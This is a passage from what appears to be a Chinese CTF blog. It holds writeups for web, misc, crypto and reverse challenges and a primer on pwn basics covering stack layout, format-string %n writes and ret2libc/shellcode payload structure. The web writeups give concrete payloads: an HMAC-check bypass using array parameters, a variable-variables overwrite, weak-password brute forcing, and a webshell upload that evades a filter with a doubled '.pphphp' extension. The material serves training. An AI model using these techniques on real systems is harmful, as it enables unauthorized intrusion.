&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldSWVYwZG9WVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowedXV0doVlYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUblJXYTFwUFZsZFNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;asdfiohaefho;$_ &#x3D; preg_replace(&quot;&#x2F;c#%bbuh;!_&amp;%ls@asc%bbzfd&#x2F;s&quot;, &#39;p&#39;, $_);$_ &#x3D; preg_replace(&quot;&#x2F;lhuh;!_&amp;%l@das%dbuioowed&#x2F;s&quot;, &#39;h&#39;, $_);$_ &#x3D; preg_replace(&quot;&#x2F;&amp;\\)buh;!_&amp;%l@as%bagsdepkl&#x2F;s&quot;, &#39;p&#39;, $_);$__ &#x3D; explode(&quot;\\n&quot;, $_);echo count($__);foreach ($__ as $____ &#x3D;&gt; $_____) &#123; for($_qpalzmxncbvsjdhfgryeuwi&#x3D;0;$_qpalzmxncbvsjdhfgryeuwi&lt;10;$_qpalzmxncbvsjdhfgryeuwi++) &#123;$_____ &#x3D; base64_decode($_____); &#125; &#125;highlight_file(__FILE__);?&gt; 看到好像还是很乱很多，其实仔细一看也挺简单的，就是对一大串字符串处理 本地测试一下让它输出变量试试，发现只有放到下图这样才会输出少量东西，其它好像都不太像flag 这个像不像常见的置换密码，试了试是ROT13加密 flag&#123;php_is_the_best_language&#125; Hi~WALLE拿到题目是这样的： dirseach一扫，发现robots.txt 访问一看，有个隐藏目录，/easy_challenge/web/dropsec/shell 访问隐藏目录，提示flag不在这里 用工具再扫一下这个目录吧，有个shell.php,访问出现点我有惊喜提示，方向好像对了，再点开，最坑爹的地方来了，也是这个地方让我知道为啥有代打出题人业务了，一把心酸泪啊 仔细观察，发现有什么不同没？ dr0psec drOpsec 一个是0，一个是O,它让我们传一个参数，刚开始一直是Url上那个参数，一直没进展 换成dr0psec随便输个1，发现提示too small,输个10000 提示too big 很明显bp爆破就行，当=2333时有flag flag&#123;l0ve_walle_robots&#125; easy audit1拿到题目是这样的： 1234567891011121314151617181920212223242526272829303132333435&lt;?phpinclude &quot;flag.php&quot;;error_reporting(0);if(empty($_GET)) &#123; highlight_file(__FILE__); die(&quot;get get get get args&quot;);&#125;$a1&#x3D;$_GET[&#39;a1&#39;];$a2&#x3D;$_GET[&#39;a2&#39;];$a3&#x3D;$_GET[&#39;a3&#39;];$a4&#x3D;$_GET[&#39;a4&#39;];$obstacle_1&#x3D;is_numeric($a2) and is_numeric($a1);if(!$obstacle_1) exit(&quot;foolish&quot;);if(!(intval($a2)&lt;1024 and intval($a2+1)&gt;1024)) exit(&quot;emmmmm&quot;);if(isset($a1))&#123; $secret&#x3D;hash_hmac(&#39;sha256&#39;,$a1,$secret);&#125;$hmac&#x3D;hash_hmac(sha256,$a2,$secret);if($a3!&#x3D;&#x3D;$hmac)&#123; die(&quot;OMG&quot;);&#125;echo &quot;give you flag: &quot;.$flag;?&gt;get get get get args 显然是一道代码审计题，我们要做的就是怎样绕过 观察题目发现可以传4个参数，GET方式 并且a1,a2要为数字 如果有两个is_numeric判断的时候用and连接起来，and后面的is_numberic判断可忽略 还要intval($a2)&lt;1024 and intval($a2+1)&gt;1024，这里的intval() 函数用于获取变量的整数值，可以用16进制或者科学记数法进行绕过 intval(字符串)为0，intval(字符串+1) 会自动转换成数值的，事实上是字符串和数字运算时发生了转换 12345678&lt;?php$a2&#x3D;&#39;1e9&#39;;echo intval($a2);#输出1echo &quot;\\n&quot;;echo intval($a2+1);#输出100000001echo &quot;\\n&quot;;echo $a2+1;#输出100000001?&gt; hash_hmac()函数是生成带有密钥的哈希值，有三个参数，如果传入加密的字符串为数组，函数将返回空字符串，就可以通过控制a1的值，我们可以让$secret为空，那么$hmac就可以控制了 cmd本地测试一下算下$a2用sha256算法加密后的结果，这里$a2取1e5,注意$a2要为字符串类型，即加上单引号或双引号 e6f66665054a43d574b8c3fb1599d6cbbc8760191d270428f2213b000f16b7e6 payload1: ?a1[]=1&amp;a2=1e5&amp;a3=e6f66665054a43d574b8c3fb1599d6cbbc8760191d270428f2213b000f16b7e6 当然a1也可以不为数组 payload2: ?a1=1&amp;a2=1e5&amp;a3=4dd2fa37e9fe33eccec13b3adcfc9c0d86e074c8e369d9d9d9db00a2c0c75ca3 flag&#123;didhfahffdjhcj38ash8y&#125; easy audit2打开题目又是道代码审计题： 123456789101112131415161718192021222324252627&lt;?phpinclude(&#39;flag.php&#39;);$flag &#x3D; &#39;xxxxxxxxxxxxxx&#39;;foreach ($_POST as $key &#x3D;&gt; $value) &#123; $a &#x3D; $value; $$$key&#x3D;$value; $ccut &#x3D; $flag; $yml &#x3D; $_GET[&quot;flag&quot;]; if ($yml &#x3D;&#x3D; &quot;iwantflag&quot;) &#123; if ($ccut &#x3D;&#x3D; &quot;flag&quot;) &#123; echo $fl4g; &#125; else &#123; echo &quot;you will get it&quot;; &#125; &#125; else &#123; echo &quot;nonono&quot;; &#125; # code...&#125;highlight_file(__FILE__); ?&gt; 仔细看看，这道题的意思就是把POST过来的数组键值遍历，GET接收一个flag的参数 输出flag的方式就是让GET方式提交的参数flag为’iwantflag’，$ccut为’flag’,而$ccut = $flag,所以就转变成让$flag=’flag’的问题了，这里我也不绕弯了，首先要了解php可变变量的概念,具体百度 payload： GET:?flag=iwantflag POST:a=flag 解释一下，当POST过去a=flag时$key=’a’,$value=’flag’,又因为$a = $value，则$a=’flag’,$$$key=$$a=$flag=$value=’flag’,构造成功 flag&#123;Varivables-are-covered-MX&#125; loginlogin拿到题目是个登录界面： bp抓包，看到这个提示，意思是说初始账号密码分别为dropsec_admin，123456 尝试用这个登陆，发现根本没反应，由此我们想可能是个假的登陆页面，dirsearch扫下吧，发现了login.php,访问一下，是个GET方式的登陆，感觉好low，尝试用默认账号密码登陆，提示login failed，bp爆破一下弱口令吧,管理员账号应该不会改，这里选择password这个字典 密码为ADMIN 登陆进去发现好像又变成考察文件上传了，并且提示只能上传jpg文件 先上传个一句话试试，bp抓下包，改下MIME(Content-Type) 发现提示：服务器把php扩展名替换成空了 我们想到双写绕过，直接再bp里改，注意php双写绕过只有.pphphp一种方式 flag&#123;dont_do_things_carelessly&#125; ji ni tai mei!发现上次新生赛的题还没删除，就写一下wp吧 打开题目是这样的 bp抓包看下吧，好像没什么提示，dirseach扫下，发现有个index.php,但是跳转到flag1.php了，再抓包来看下吧 发现提示：flag200.php，访问下发现还是和flag1.php一样，试着k，发现就403了，而200之前的好像都存在，bp爆破一下吧 flag157.php的长度显然不同，看下响应头，flag到手 flag&#123;really_beaut1ful~&#125; MISCThe Wonderful WizardStegsolve打开，切换一下，可以看到flag,是16进制的转成字符就行 easy image扫描二维码 神奇的压缩包本题源自bugku杂项神秘的文件，做题方法是明文攻击 解压题目，发现有flag.zip和logo.png两个文件，并且flag.zip是加密的，里面有也有两个文件，一个docx文件和logo.png 这时我们想到了明文攻击，将logo.png添加到压缩文件，然后就用到ARCHPR了，注意，请注意CRC一定要相同才能用ARCHPR明文攻击，否则会报错(第二张图)： 爆破结果出来 输入口令解压，将docx文件拖到虚拟机binwalk分离一下，得到flag.txt,base64解码得到flag flag&#123;d0cX_1s_ziP_file&#125; 放松一下摩斯电码 REVERSEreverse2用uncompyle6反编译.py文件，改下源码 CRYPTOWelcomeascci码转字符 Alphabet百度一下是字母表的意思，打开之后是这样的： 我们可以想到前面的Alphabet应该不是加密的内容，然后后面跟了一串字符串，可以看到有{}这两个符号，前面一串是大写字母，后面是小写子母，并且{前的小写字母刚好是四个，大写字母刚为26个 不扯了，这题的解法就是前面的26大写字母，分别对应着字母表的26个字母，我们要做的就是找到后面的一串小写字母在前面大写字母的序号，和真实的字母表一一对应就可以得到flag,奉上解密脚本 12345678910tr&#x3D;&quot;WCGPSUHRAQYKFDLZOJNXMVEBT&quot;secert&#x3D;&quot;ukwh&#123;ljwdhsqmags&#125;&quot;flag&#x3D;&quot;&quot;for s in secert: if s!&#x3D;&quot;&#123;&quot; and s!&#x3D;&quot;&#125;&quot;: num&#x3D;tr.index(s.upper()) flag+&#x3D;chr(num+ord(&quot;a&quot;)) else: flag+&#x3D;sprint(flag) flag也奉上 flag&#123;orangejuice&#125; 富强民主社会主义核心价值观解码 baby’s baby rsaM=Cd%n 套公式","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"}]},{"title":"pwn入门基本知识","slug":"pwn-base","date":"2019-07-22T13:33:29.000Z","updated":"2019-10-17T05:55:22.107Z","comments":true,"path":"2019/07/22/pwn-base/","link":"","permalink":"http://www.moonback.xyz/2019/07/22/pwn-base/","excerpt":"本篇博客记录了学习pwn入门的一些东西，包括一些常见概念和常见漏洞及利用方法","text":"本篇博客记录了学习pwn入门的一些东西，包括一些常见概念和常见漏洞及利用方法 一些概念文件段：bss段：（未手动初始化的数据）并不给该段的数据分配空间，只是记录数据所需空间的大小 data段：（已手动初始化的数据）段则为数据分配空间，数据保存在目标文件中 text段：代码段（code segment/text segment）通常是指用来存放程序执行代码的一块内存区域。这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读(某些架构也允许代码段为可写，即允许修改程序)。在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等 堆（heap）： 堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。 当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）； 当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减） 栈(stack)： 栈又称堆栈，是用户存放程序临时创建的局部变量，也就是说我们函数括弧“&#123;&#125;”中定义的变量 （但不包括static声明的变量，static意味着在数据段中存放变量）。除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中， 并且待到调用结束后，函数的返回值也会被存放回栈中。由于栈的先进先出(FIFO)特点，所以栈特别方便用来保存/恢复调用现场。 常见寄存器esp:用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化 ebp:用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置 eip:用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令 函数调用时栈的变化 首先将被调用函数的参数按照逆序依次压入栈内，没有参数则没有这一步 将被调用函数的返回地址压入栈内 将调用函数的基地址（ebp）压入栈内，并将当前栈顶地址传到 ebp 寄存器内 将被调用函数的局部变量压入栈内 将被调用函数的局部变量弹出栈外 将调用函数的基地址（ebp）弹出栈外，并存到 ebp 寄存器内 将被调用函数的返回地址弹出栈外，并存到 eip 寄存器内 GOT和PLT表GOT 全称是全局偏移量表（Global Offset Table），用来存储外部函数在内存的确切地址。GOT 存储在数据段（Data Segment）内，可以在程序运行中被修改。PLT 全称是程序链接表（Procedure Linkage Table），用来存储外部函数的入口点（entry），换言之程序总会到 PLT 这里寻找外部函数的地址。PLT 存储在代码段（Code Segment）内，在运行之前就已经确定并且不会被修改，所以 PLT 并不会知道程序运行时动态链接库被加载的确切位置。PLT 表内存储的入口点就是 GOT 表中对应条目的地址。 程序的保护机制CANNARY(栈保护)这个选项表示栈保护功能有没有开启。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。 PIE（ASLR）一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。内存地址随机化机制（address space layout randomization)，有以下三种情况: 0 - 表示关闭进程地址空间随机化。 1 - 表示将mmap的基址，stack和vdso页面随机化。 2 - 表示在1的基础上增加栈（heap）的随机化。 可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。 NX（DEP）(数据执行保护 Data Execution Prevention)NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 检测方法 在安装过pwntools终端输入checksec+文件名 格式化字符串漏洞原因：正确使用printf是这样的： 12345678#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;int main()&#123; int n&#x3D;5; printf(&quot;%d&quot;,n); return 0;&#125; 也有人这样： 12345678#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;int main()&#123; char a[]&#x3D;&quot;neuqcsa&quot;; printf(a); return 0;&#125; 上面的代码不会有什么问题，但是如果将字符串的输入权交给用户就会有问题了。看下面的代码： 123456789#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;int main()&#123; char a[100]; scanf(&quot;%s&quot;,a); printf(a); return 0;&#125; 如果用户输入的字符串是”%x%x%x”，则会输出以下结果： 图片上显示的是内存的数据，以上就是产生漏洞的原因了 一些参数: %c：输出字符，配上%n可用于向指定地址写数据。 %d：输出十进制整数，配上%n可用于向指定地址写数据。 %x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制据， %i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。 %p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节， 在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。 %s：输出的内容是字符串，即将偏移处指针指向的字符串输出， 如%i$s表示输出偏移i处地址所指向的字符串， 在32bit和64bit环境下一样，可用于读取GOT表等信息。 %n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置， 如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节）， 而%$hn表示写入的地址空间为2字节， %$hhn表示写入的地址空间为1字节， %$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。 有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。 %n是通过格式化字符串漏洞改变程序流程的关键方式， 而其他格式化字符串参数可用于读取信息或配合%n写数据。 漏洞利用 栈溢出原理：让 eip 载入攻击指令的地址 shellcode前提：在函数调用栈上的数据（shellcode）要有可执行的权限，并且关闭内存布局随机化 原理：修改返回地址，让其指向溢出数据中的一段指令 payload : padding1 + address of shellcode + padding2 + shellcode 具体细节： **padding1:**代表函数参数，逆序进入栈中，可以随意填充,长度应该刚好覆盖函数的基地址 获取长度方法：1.查看汇编代码 2.运行程序时用不断增加输入长度的方法来试探 **address of shellcode:**shellcode 起始处的地址，用来覆盖返回地址 padding2：可以随意填充，长度可以任意 **shellcode:**应为十六进制的机器码格式 Return2libc前提：操作系统关闭内存布局随机化（ASLR），而且 shellcode 还需要程序调用栈有可执行权限 **原理:**修改返回地址，让其指向内存中已有的某个函数 payload: padding1 + address of system() + padding2 + address of “/bin/sh” 具体细节： address of system()：是 system() 在内存中的地址，用来覆盖返回地址 程序是如何调用动态链接库中的函数的过程： 当函数被动态链接至程序中，程序在运行时首先确定动态链接库在内存的起始地址，再加上函数在动态库中的相对偏移量，最终得到函数在内存的绝对地址 padding2：该处的数据长度为4（32位机），对应调用 system() 时的返回地址 address of “/bin/sh”：是字符串 “/bin/sh” 在内存中的地址，作为传给 system() 的参数。 ROP ( Return Oriented Programming )前提： 原理：修改返回地址，让其指向内存中已有的一段指令 payload1 : padding + address of gadget payload2 : padding + address of gadget 1 + address of gadget 2 + ...... + address of gadget n 具体细节： Hijack GOT前提： 原理：修改某个被调用函数的地址，让其指向另一个函数 具体细节： 一些工具的使用IDAgdbCyclic的使用简介：Cyclic pattern是一个很强大的功能，大概意思就是，使用pwntools生成一个pattern，pattern就是指一个字符串，可以通过其中的一部分数据去定位到他在一个字符串中的位置。 命令： cyclic 100 用来生成一个特殊的字符串，随意取都不重复 cyclic -l 字符串 查找字符串位置","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"http://www.moonback.xyz/tags/pwn/"},{"name":"二进制","slug":"二进制","permalink":"http://www.moonback.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"}]}],"categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"vulnstack","slug":"vulnstack","permalink":"http://www.moonback.xyz/tags/vulnstack/"},{"name":"域渗透","slug":"域渗透","permalink":"http://www.moonback.xyz/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"},{"name":"writeupt","slug":"writeupt","permalink":"http://www.moonback.xyz/tags/writeupt/"},{"name":"crypto","slug":"crypto","permalink":"http://www.moonback.xyz/tags/crypto/"},{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"强网杯","slug":"强网杯","permalink":"http://www.moonback.xyz/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"},{"name":"内网渗透","slug":"内网渗透","permalink":"http://www.moonback.xyz/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"ISCC","slug":"ISCC","permalink":"http://www.moonback.xyz/tags/ISCC/"},{"name":"Vulhub","slug":"Vulhub","permalink":"http://www.moonback.xyz/tags/Vulhub/"},{"name":"CVE","slug":"CVE","permalink":"http://www.moonback.xyz/tags/CVE/"},{"name":"反序列化","slug":"反序列化","permalink":"http://www.moonback.xyz/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"NPUCTF","slug":"NPUCTF","permalink":"http://www.moonback.xyz/tags/NPUCTF/"},{"name":"墨者学院","slug":"墨者学院","permalink":"http://www.moonback.xyz/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"},{"name":"MRCTF","slug":"MRCTF","permalink":"http://www.moonback.xyz/tags/MRCTF/"},{"name":"Python","slug":"Python","permalink":"http://www.moonback.xyz/tags/Python/"},{"name":"未授权访问","slug":"未授权访问","permalink":"http://www.moonback.xyz/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"name":"Redis","slug":"Redis","permalink":"http://www.moonback.xyz/tags/Redis/"},{"name":"Docker","slug":"Docker","permalink":"http://www.moonback.xyz/tags/Docker/"},{"name":"mysql","slug":"mysql","permalink":"http://www.moonback.xyz/tags/mysql/"},{"name":"提权","slug":"提权","permalink":"http://www.moonback.xyz/tags/%E6%8F%90%E6%9D%83/"},{"name":"折腾","slug":"折腾","permalink":"http://www.moonback.xyz/tags/%E6%8A%98%E8%85%BE/"},{"name":"中间人攻击","slug":"中间人攻击","permalink":"http://www.moonback.xyz/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"name":"php","slug":"php","permalink":"http://www.moonback.xyz/tags/php/"},{"name":"BJDCTF","slug":"BJDCTF","permalink":"http://www.moonback.xyz/tags/BJDCTF/"},{"name":"thinkphp","slug":"thinkphp","permalink":"http://www.moonback.xyz/tags/thinkphp/"},{"name":"vulhub","slug":"vulhub","permalink":"http://www.moonback.xyz/tags/vulhub/"},{"name":"复现","slug":"复现","permalink":"http://www.moonback.xyz/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"phpmyadmin","slug":"phpmyadmin","permalink":"http://www.moonback.xyz/tags/phpmyadmin/"},{"name":"linux","slug":"linux","permalink":"http://www.moonback.xyz/tags/linux/"},{"name":"弱口令","slug":"弱口令","permalink":"http://www.moonback.xyz/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"},{"name":"msf","slug":"msf","permalink":"http://www.moonback.xyz/tags/msf/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"},{"name":"日志","slug":"日志","permalink":"http://www.moonback.xyz/tags/%E6%97%A5%E5%BF%97/"},{"name":"CTFshow","slug":"CTFshow","permalink":"http://www.moonback.xyz/tags/CTFshow/"},{"name":"wirteup","slug":"wirteup","permalink":"http://www.moonback.xyz/tags/wirteup/"},{"name":"python","slug":"python","permalink":"http://www.moonback.xyz/tags/python/"},{"name":"ssti","slug":"ssti","permalink":"http://www.moonback.xyz/tags/ssti/"},{"name":"pop","slug":"pop","permalink":"http://www.moonback.xyz/tags/pop/"},{"name":"VulnHub","slug":"VulnHub","permalink":"http://www.moonback.xyz/tags/VulnHub/"},{"name":"靶机","slug":"靶机","permalink":"http://www.moonback.xyz/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"xss","slug":"xss","permalink":"http://www.moonback.xyz/tags/xss/"},{"name":"HAGAME","slug":"HAGAME","permalink":"http://www.moonback.xyz/tags/HAGAME/"},{"name":"NetCat","slug":"NetCat","permalink":"http://www.moonback.xyz/tags/NetCat/"},{"name":"Nmap","slug":"Nmap","permalink":"http://www.moonback.xyz/tags/Nmap/"},{"name":"WireShack","slug":"WireShack","permalink":"http://www.moonback.xyz/tags/WireShack/"},{"name":"bypass","slug":"bypass","permalink":"http://www.moonback.xyz/tags/bypass/"},{"name":"http走私","slug":"http走私","permalink":"http://www.moonback.xyz/tags/http%E8%B5%B0%E7%A7%81/"},{"name":"buuctf","slug":"buuctf","permalink":"http://www.moonback.xyz/tags/buuctf/"},{"name":"文件上传","slug":"文件上传","permalink":"http://www.moonback.xyz/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"代码注入","slug":"代码注入","permalink":"http://www.moonback.xyz/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"},{"name":"命令执行","slug":"命令执行","permalink":"http://www.moonback.xyz/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"sql注入","slug":"sql注入","permalink":"http://www.moonback.xyz/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"代码审计","slug":"代码审计","permalink":"http://www.moonback.xyz/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"wpscan","slug":"wpscan","permalink":"http://www.moonback.xyz/tags/wpscan/"},{"name":"wordpress","slug":"wordpress","permalink":"http://www.moonback.xyz/tags/wordpress/"},{"name":"伪随机数","slug":"伪随机数","permalink":"http://www.moonback.xyz/tags/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"},{"name":"GXY","slug":"GXY","permalink":"http://www.moonback.xyz/tags/GXY/"},{"name":"hash","slug":"hash","permalink":"http://www.moonback.xyz/tags/hash/"},{"name":"xxe","slug":"xxe","permalink":"http://www.moonback.xyz/tags/xxe/"},{"name":"MSF","slug":"MSF","permalink":"http://www.moonback.xyz/tags/MSF/"},{"name":"shell","slug":"shell","permalink":"http://www.moonback.xyz/tags/shell/"},{"name":"CTFd","slug":"CTFd","permalink":"http://www.moonback.xyz/tags/CTFd/"},{"name":"docker","slug":"docker","permalink":"http://www.moonback.xyz/tags/docker/"},{"name":"环境搭建","slug":"环境搭建","permalink":"http://www.moonback.xyz/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"name":"php函数","slug":"php函数","permalink":"http://www.moonback.xyz/tags/php%E5%87%BD%E6%95%B0/"},{"name":"rce","slug":"rce","permalink":"http://www.moonback.xyz/tags/rce/"},{"name":"JWT","slug":"JWT","permalink":"http://www.moonback.xyz/tags/JWT/"},{"name":"wp","slug":"wp","permalink":"http://www.moonback.xyz/tags/wp/"},{"name":"SYC","slug":"SYC","permalink":"http://www.moonback.xyz/tags/SYC/"},{"name":"Aircrack-ng","slug":"Aircrack-ng","permalink":"http://www.moonback.xyz/tags/Aircrack-ng/"},{"name":"wifi破解","slug":"wifi破解","permalink":"http://www.moonback.xyz/tags/wifi%E7%A0%B4%E8%A7%A3/"},{"name":"kali","slug":"kali","permalink":"http://www.moonback.xyz/tags/kali/"},{"name":"hackgame","slug":"hackgame","permalink":"http://www.moonback.xyz/tags/hackgame/"},{"name":"博客","slug":"博客","permalink":"http://www.moonback.xyz/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"hexo","slug":"hexo","permalink":"http://www.moonback.xyz/tags/hexo/"},{"name":"webshell","slug":"webshell","permalink":"http://www.moonback.xyz/tags/webshell/"},{"name":"jarvisoj","slug":"jarvisoj","permalink":"http://www.moonback.xyz/tags/jarvisoj/"},{"name":"bugku","slug":"bugku","permalink":"http://www.moonback.xyz/tags/bugku/"},{"name":"文件包含","slug":"文件包含","permalink":"http://www.moonback.xyz/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"进制","slug":"进制","permalink":"http://www.moonback.xyz/tags/%E8%BF%9B%E5%88%B6/"},{"name":"编码","slug":"编码","permalink":"http://www.moonback.xyz/tags/%E7%BC%96%E7%A0%81/"},{"name":"pwn","slug":"pwn","permalink":"http://www.moonback.xyz/tags/pwn/"},{"name":"二进制","slug":"二进制","permalink":"http://www.moonback.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"}]}